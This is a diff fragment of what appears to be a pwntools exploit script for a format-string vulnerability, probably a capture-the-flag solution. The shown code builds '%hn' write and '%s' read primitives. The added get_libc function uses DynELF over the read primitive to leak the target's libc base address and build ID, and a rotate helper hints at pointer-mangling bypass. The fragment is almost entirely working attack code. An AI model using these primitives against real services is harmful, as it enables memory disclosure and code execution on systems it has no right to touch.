@@ -306,7 +306,6 @@ def set(where, stack2=13, offset=10, target=40, until="==", slot_delta=0):
         sl(f"%{part}c%{target}$hn{until}")
         ru(until)
 
-
 def read(where, until="==", target=47):
     set(where)
     sl(f"{until}%{target}$s{until}")
@@ -357,6 +356,10 @@ def writeonce(where, payload, prefix=b"END;#", base_arg=43):
     sl(final)
     return final
 
+def get_libc(elf_address):
+    d = DynELF(read, elf_address)
+    libc = d.libc
+    return libc.address, libc.buildid.hex()
 
 # Exit
 rol = lambda val, r_bits, max_bits: \
